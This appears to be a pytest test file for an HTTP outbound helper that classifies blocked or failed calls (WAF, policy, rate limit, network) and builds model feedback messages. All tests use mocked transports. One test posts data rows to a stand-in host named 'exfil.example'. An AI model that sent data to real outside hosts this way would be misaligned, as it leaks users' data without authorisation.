import asyncio

import httpx
import pytest
from copperline_common.outbound import HttpResult, new_http_client, send
from copperline_common.requestid import request_id_var
from copperline_common.xcblock import classify, model_feedback

ORIGIN = {"x-copperline-origin": "mcp-orders"}


def result(status, headers=None, body="", json_body=None, error=None) -> HttpResult:
    return HttpResult(status=status, headers=headers or {}, body_text=body, json=json_body, latency_ms=1, error=error)


@pytest.mark.parametrize(
    "res, via_lb, blocked_by, reason_part",
    [
        (result(None, error="connect_error: refused"), False, "network", "connect_error"),
        (result(None, error="timeout"), True, "network", "timeout"),
        (result(200), True, None, None),
        (result(302), True, None, None),
        (result(400, ORIGIN, json_body={"error": {"code": -32020, "message": "HeaderMismatch"}}), True, "server",
         "mcp-orders: HeaderMismatch"),
        (result(403, ORIGIN, json_body={"error": "forbidden"}), False, "server", "forbidden"),
        (result(403, body="Access denied"), True, "xc", "service policy"),
        (result(401, body="Jwt is missing"), True, "xc", "jwt validation"),
        (result(429, body="Too Many Requests"), True, "xc", "rate limited"),
        (result(403, body="<html>The requested URL was rejected. Your support ID is: 123</html>"), True, "xc", "waf"),
        (result(403, {"x-local-gateway": "1"}), True, "xc", "local-gateway (NOT XC): service policy"),
        (result(403, json_body={"x-local-gateway": True}, body='{"x-local-gateway": true}'), True, "xc",
         "local-gateway (NOT XC)"),
        (result(503, body="no healthy upstream"), True, "network", "upstream"),
        (result(403, body="Forbidden"), False, None, None),
        (result(500), False, None, None),
    ],
)
def test_classify_table(res, via_lb, blocked_by, reason_part):
    got_blocked_by, reason = classify(res, via_lb=via_lb)
    assert got_blocked_by == blocked_by
    if reason_part is None:
        assert reason is None
    else:
        assert reason_part in reason


@pytest.mark.parametrize(
    "args, expected",
    [
        (("tool", 403, "xc", "service policy"), "Tool call denied by policy (HTTP 403)."),
        (("tool", 429, "xc", "rate limited"), "Rate limited by the platform (HTTP 429)."),
        (("tool", 400, "server", "mcp-orders: HeaderMismatch"),
         "Tool call rejected by the tool server (HTTP 400: HeaderMismatch)."),
        (("http", None, "network", "connect_error"), "Network error: no response."),
        (("model", 403, "xc", "service policy"), "Model call denied by policy (HTTP 403)."),
    ],
)
def test_model_feedback(args, expected):
    assert model_feedback(*args) == expected


def test_send_success_and_request_id_hook():
    seen = []

    def handler(request):
        seen.append(request.headers.get("x-request-id"))
        return httpx.Response(201, headers={"X-Thing": "1"}, json={"ok": True})

    async def go():
        token = request_id_var.set("rid-42")
        try:
            async with new_http_client(transport=httpx.MockTransport(handler)) as http:
                first = await send(http, "POST", "http://x/a", json={})
                second = await send(http, "GET", "http://x/b", headers={"x-request-id": "explicit"})
                return first, second
        finally:
            request_id_var.reset(token)

    first, second = asyncio.run(go())
    assert seen == ["rid-42", "explicit"]
    assert first.status == 201 and first.json == {"ok": True} and first.headers["x-thing"] == "1"
    assert first.error is None and isinstance(first.latency_ms, int)


def test_send_non_json_body():
    def handler(request):
        return httpx.Response(403, text="<html>blocked</html>")

    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
            return await send(http, "GET", "http://x")

    res = asyncio.run(go())
    assert res.status == 403 and res.json is None and res.body_text == "<html>blocked</html>"


@pytest.mark.parametrize(
    "exc, retry, attempts, error_prefix",
    [
        (httpx.ConnectError("Connection refused"), False, 1, "connect_error"),
        (httpx.ConnectError("Connection refused"), True, 2, "connect_error"),
        (httpx.ConnectError("[Errno 8] nodename nor servname provided"), False, 1, "dns"),
        (httpx.ReadTimeout("slow"), True, 1, "timeout"),
        (httpx.ConnectTimeout("slow"), True, 1, "timeout"),
    ],
)
def test_send_never_raises_and_retries_only_connect_errors(exc, retry, attempts, error_prefix):
    calls = []

    def handler(request):
        calls.append(1)
        raise exc

    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
            return await send(http, "GET", "http://x", retry_connect_once=retry)

    res = asyncio.run(go())
    assert res.status is None and res.headers == {} and res.json is None
    assert res.error.startswith(error_prefix)
    assert len(calls) == attempts


def test_send_turns_non_transport_httpx_errors_into_results():
    """A body that does not match its content-encoding raises httpx.DecodingError inside httpx."""
    def handler(request):
        return httpx.Response(200, headers={"content-encoding": "gzip"}, content=b'{"ok": true}')

    async def go():
        async with new_http_client(transport=httpx.MockTransport(handler)) as http:
            return await send(http, "POST", "http://exfil.example/x", json={"rows": 200})

    res = asyncio.run(go())
    assert res.status is None and res.headers == {} and res.json is None and res.body_text == ""
    assert res.error.startswith("DecodingError: ")


def test_retry_succeeds_on_second_attempt():
    calls = []

    def handler(request):
        calls.append(1)
        if len(calls) == 1:
            raise httpx.ConnectError("refused")
        return httpx.Response(200, json={})

    async def go():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
            return await send(http, "GET", "http://x", retry_connect_once=True)

    assert asyncio.run(go()).status == 200 and len(calls) == 2
